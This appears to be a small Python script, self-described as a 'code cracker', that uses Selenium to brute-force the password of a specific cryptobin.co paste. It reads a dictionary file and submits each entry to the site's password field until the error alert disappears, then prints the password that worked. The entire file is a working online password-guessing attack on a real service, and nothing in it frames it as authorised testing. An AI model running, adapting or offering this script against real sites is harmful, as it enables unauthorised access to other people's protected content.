from selenium import webdriver
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
import time
# first version of code cracker that finds input box on website (made for cryptobin.co)
# and repeatedly inputs from a dictionary txt file.

# you can change .Firefox to other browsers but it may require modification.
with webdriver.Firefox() as driver:
    driver.get("https://cryptobin.co/w177y163")

# place dict file in path and reference it here
    with open('list.txt') as f:
        lines = f.readlines()

    password_field = driver.find_element(By.ID, "paste-password")

    count = len(lines)
    for i, line in enumerate(lines):
        print(f'Trying password #{i+1}: {line}'
              f'Progress: {round((i / count) * 100, 2)}%')
        password_field.send_keys(line + Keys.RETURN)

        if not driver.find_element(By.CLASS_NAME, 'alert-danger').is_displayed():
            print(f"The password is {line}")
            break